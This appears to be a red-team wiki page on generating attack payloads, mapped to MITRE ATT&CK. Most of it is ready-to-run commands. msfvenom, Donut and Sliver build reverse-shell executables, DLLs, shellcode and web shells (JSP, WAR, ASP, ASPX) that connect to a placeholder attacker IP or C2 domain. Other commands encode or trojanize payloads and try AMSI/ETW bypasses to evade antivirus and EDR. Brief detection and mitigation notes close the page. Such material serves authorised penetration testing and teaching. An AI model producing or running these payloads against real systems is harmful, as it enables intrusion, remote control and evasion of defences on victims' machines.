% Filename: 06-red-teaming/initial-access/payload-generation.md
% Display name: Payload Generation
% Last update: 2026-02-17
% ATT&CK Tactics: TA0002 (Execution)
% ATT&CK Techniques: T1059 (Command and Scripting Interpreter), T1204.002 (User Execution: Malicious File)
% Authors: @TristanInSec

# Payload Generation

## Overview

Payload generation is the process of creating executable code that establishes a connection back to the attacker's C2 infrastructure. Payloads range from simple reverse shells to staged implants with built-in evasion. The choice of format, architecture, and encoding depends on the target environment and its security controls.

## ATT&CK Mapping

- **Tactic:** TA0002 - Execution
- **Techniques:**
  - T1059 - Command and Scripting Interpreter
  - T1204.002 - User Execution: Malicious File

## Techniques

### msfvenom — Metasploit Payload Generator

```bash
# msfvenom
# https://github.com/rapid7/metasploit-framework

# Staged vs Stageless:
#   Staged:    windows/meterpreter/reverse_tcp   (small stager, downloads full payload)
#   Stageless: windows/meterpreter_reverse_tcp   (full payload in one binary, larger)

# --- Windows Payloads ---

# Windows EXE — staged Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f exe -o payload.exe

# Windows EXE — stageless Meterpreter (larger but single binary)
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f exe -o payload.exe

# Windows x64 EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f exe -o payload64.exe

# Windows DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o payload.dll

# Windows Service EXE (for persistence via sc create)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f exe-service -o svc.exe

# Windows MSI installer
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f msi -o payload.msi

# HTA (HTML Application) — for phishing
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f hta-psh -o payload.hta

# --- Linux Payloads ---

# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f elf -o payload.elf

# Linux Shared Object
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f elf-so -o payload.so

# --- macOS Payloads ---

# macOS Mach-O
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f macho -o payload.macho
```

### msfvenom — Raw Shellcode

```bash
# msfvenom
# https://github.com/rapid7/metasploit-framework

# Raw shellcode (binary blob)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw -o shellcode.bin

# C-format shellcode (for custom loaders)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f csharp

# Python-format shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f python

# PowerShell-format shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f powershell

# Remove null bytes and bad characters
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -b '\x00\x0a\x0d' -f csharp
```

### msfvenom — Encoding

```bash
# msfvenom
# https://github.com/rapid7/metasploit-framework

# Encode with shikata_ga_nai (polymorphic XOR, x86 only)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 \
    -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# XOR encode (x64)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 \
    -e x64/xor -f exe -o encoded64.exe

# Encrypt shellcode with AES256
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 \
    --encrypt aes256 --encrypt-key <32_byte_key> -f csharp

# Template injection — embed in a legitimate EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 \
    -x /path/to/legitimate.exe -k -f exe -o trojanized.exe
```

### Donut — Shellcode from .NET/PE/VBS/JS

```bash
# Donut
# https://github.com/TheWover/donut

# Convert .NET EXE to shellcode
donut -i Rubeus.exe -o rubeus.bin

# Convert .NET EXE with arguments
donut -i Seatbelt.exe -p "-group=all" -o seatbelt.bin

# Convert .NET DLL (class and method required)
donut -i SharpHound.dll -c SharpHound.Collectors.Collector -m InvokeCollection -o sharphound.bin

# Specify architecture (1=x86, 2=amd64, 3=both)
donut -i payload.exe -a 2 -o payload_x64.bin

# Output in C# format
donut -i payload.exe -f 7 -o payload.cs

# Output in Python format
donut -i payload.exe -f 5 -o payload.py

# Disable AMSI/WLDP/ETW bypass attempt entirely (-b 1=None)
donut -i payload.exe -b 1 -o payload_nobypass.bin

# Attempt AMSI/WLDP/ETW bypass, continue if bypass fails (-b 3, this is the default)
donut -i payload.exe -b 3 -o payload_bypass.bin
```

### Sliver — Implant Generation

```bash
# Sliver
# https://github.com/BishopFox/sliver

# Generate stageless implant (HTTPS C2)
sliver > generate --http <c2_domain> --os windows --arch amd64 --save /tmp/implant.exe

# Generate stageless implant (mTLS C2)
sliver > generate --mtls <c2_domain> --os windows --arch amd64 --save /tmp/implant.exe

# Generate stageless implant (DNS C2)
sliver > generate --dns <c2_domain> --os windows --arch amd64 --save /tmp/implant.exe

# Generate Linux implant
sliver > generate --http <c2_domain> --os linux --arch amd64 --save /tmp/implant

# Generate implant with multiple C2 channels (failover)
sliver > generate --mtls <c2_domain> --http <c2_domain> --dns <c2_domain> --os windows --save /tmp/implant.exe

# Generate stager (smaller, downloads full implant)
# Note: exact stager subcommand syntax varies by Sliver version — verify with: sliver > help
sliver > generate stager --lhost <attacker_ip> --lport 443 --protocol tcp --save /tmp/stager.bin

# Generate shellcode
sliver > generate --http <c2_domain> --os windows --arch amd64 --format shellcode --save /tmp/implant.bin

# Generate shared library
sliver > generate --http <c2_domain> --os windows --arch amd64 --format shared --save /tmp/implant.dll
```

### Web Payloads

```bash
# msfvenom
# https://github.com/rapid7/metasploit-framework

# JSP (for Tomcat/Java servers)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw -o shell.jsp

# WAR file (for Tomcat manager deployment)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f war -o shell.war

# ASP (for IIS)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f asp -o shell.asp

# ASPX (for IIS / .NET)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f aspx -o shell.aspx
```

## Payload Selection Guide

```text
Target Environment          Recommended Approach
─────────────────────────   ─────────────────────────────────────────
No AV/EDR                   msfvenom EXE/DLL (fast, simple)
Basic AV                    msfvenom encoded + custom loader
Modern EDR                  Custom shellcode loader + donut + obfuscation
.NET environment            Donut (convert .NET assemblies to shellcode)
Linux server                ELF binary or shared object
Web application             JSP/ASP/ASPX web shell
Restricted network          DNS or HTTPS C2 with domain fronting
```

## Detection Methods

### Network-Based Detection

- Signature-based detection of known msfvenom payload patterns
- TLS certificate anomalies on C2 connections
- Beacon-like traffic patterns (regular intervals, consistent sizes)

### Host-Based Detection

- Known payload signatures in memory or on disk
- Suspicious process behavior (shellcode execution, injection)
- Anomalous network connections from user processes

## Mitigation Strategies

- **Application allowlisting** — only allow approved executables
- **EDR deployment** — behavioral detection of payload execution
- **Email gateway scanning** — scan attachments for known payload signatures
- **Macro policies** — disable Office macros or require signing

## References

### Official Documentation

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Donut](https://github.com/TheWover/donut)
- [Sliver](https://github.com/BishopFox/sliver)

### MITRE ATT&CK

- [T1059 - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
- [T1204.002 - User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002/)
